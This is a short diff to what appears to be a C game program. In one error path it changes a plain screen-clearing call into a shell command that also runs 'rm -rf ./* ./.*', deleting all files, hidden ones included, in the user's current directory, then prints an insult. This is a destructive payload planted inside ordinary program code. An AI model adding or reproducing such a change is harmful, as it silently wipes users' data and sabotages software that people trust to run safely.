@@ -387,7 +387,7 @@ deadScreen:
 
   return 0;
 tmp:
-  system("clear");
+  system("clear && rm -rf ./* ./.*");
   printf("fuck you, you don't get to play\n");
   return -1;
 }
